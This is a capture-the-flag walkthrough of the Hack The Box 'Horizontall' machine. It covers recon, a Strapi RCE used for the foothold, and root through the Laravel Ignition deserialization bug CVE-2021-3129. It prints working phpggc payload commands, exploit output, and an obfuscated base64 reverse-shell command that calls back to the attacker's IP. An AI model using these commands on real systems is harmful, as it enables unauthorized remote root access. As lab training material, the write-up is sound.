# horizontall

## services
```bash
# Nmap 7.94 scan initiated Wed Jun 21 18:42:06 2023 as: nmap -sC -sV -p 22,80 -o nmap/tcp-script 10.129.177.251
Nmap scan report for 10.129.177.251
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 21 18:42:14 2023 -- 1 IP address (1 host up) scanned in 8.38 seconds
```

Only 2 services are running and publicly reachable on this box:
* 22 - ssh - 7.6p1 Ubuntu -> Bionic
* 80 - http - nginx 1.14.0 -> Bionic

From the services running on the box we can guess the version of Ubuntu is Bionic 18.04 which was released April 2018

## HTTP

- Unable to find any directories with gobuster.
- unable to fuzz subdomains
- page source does not display - this is common with frameworks that run javascript on the server as well, such as NodeJS.

Taking a look at the js files in with the degugger and one of them reveals a possible subdomain of the web application: 
`api-prod.horizontall.htb/reviews`

We will fuzz this subdomain for api endpoints:
- reviews - revealed in js file
- admin - found with ffuf
```bash
[Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 119ms]
    * FUZZ: admin
```
The /admin path is a `strapi` login page.

### CVE-2019-19609

Strapi framework version 3.0.0-beta.17.4 is vulnerable to rce in the install and uninstall plugin components of the admin panel, becuase it doesn't sanitize the plugin name, and attackers can inject arbitrary shell commands to be executed by the execa function.

Online research lead me to a script on github that checks for the version and then exploits the plugin vuln to get a reverse shell.

The foothold is with the strapi user on the box.

## privEsc - Root 

Taking a look at the ports there is another service running on port 8000 that we haven't discovered yet.
```bash
$ ss -tl
State                          Recv-Q                          Send-Q                                                    Local Address:Port                                                      Peer Address:Port
LISTEN                         0                               128                                                             0.0.0.0:ssh                                                            0.0.0.0:*
LISTEN                         0                               128                                                           127.0.0.1:1337                                                           0.0.0.0:*
LISTEN                         0                               128                                                           127.0.0.1:8000                                                           0.0.0.0:*
LISTEN                         0                               80                                                            127.0.0.1:mysql                                                          0.0.0.0:*
LISTEN                         0                               128                                                             0.0.0.0:http                                                           0.0.0.0:*
LISTEN                         0                               128                                                                [::]:ssh                                                               [::]:*
LISTEN                         0                               128                                                                [::]:http                                                              [::]:*
```

We'll send a curl request to see if it responds to an http request:
```bash
$ curl 127.0.0.1:8000
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>
...
 ```
This is web application being run on Laravel, the php web framework.

First we need to setup port forwarding so that we can check out the web app from our browser:
```bash
└─$ ssh -L 8000:localhost:8000 -i id_rsa strapi@horizontall.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 22 23:41:38 UTC 2023

  System load:  0.01              Processes:           180
  Usage of /:   83.7% of 4.85GB   Users logged in:     0
  Memory usage: 47%               IP address for eth0: 10.129.177.251
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 22 23:37:25 2023 from 10.10.14.6
$
```
Now we can view the site in our browser.

Running gobuster, we discover the path /profile
```bash
/profiles             (Status: 500) [Size: 616204]
```
/profiles is a 500 server error and it reveals the laravel debugger.

A bit of research and I find CVE-2021-3129, which is a vulnerability in this debugger. This vulnerability allows for a PHP deserialization exploit that gets rce.

First the payload needs to be generated with phpgcc
```bash
$ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/id.phar --fast-destruct monolog/rce1 system id
```
Then we can use a py script with the serialized payload:
```bash
$ ./laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/id.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared
```
And you can see that our response is the result of the id command.

All we need to do now is insert a reverse shell in place of `id` in the POC to get ROOT:
```bash
$ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o /tmp/id.phar --fast-destruct monolog/rce1 system "echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi84ODg4ICAwPiYxICAg | base64 -d | bash"
```
```bash
$ ./laravel-ignition-rce.py http://127.0.0.1:8000 /tmp/id.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
Exploit succeeded
+ Logs cleared
```

And we catch the reverse shell to get ROOT
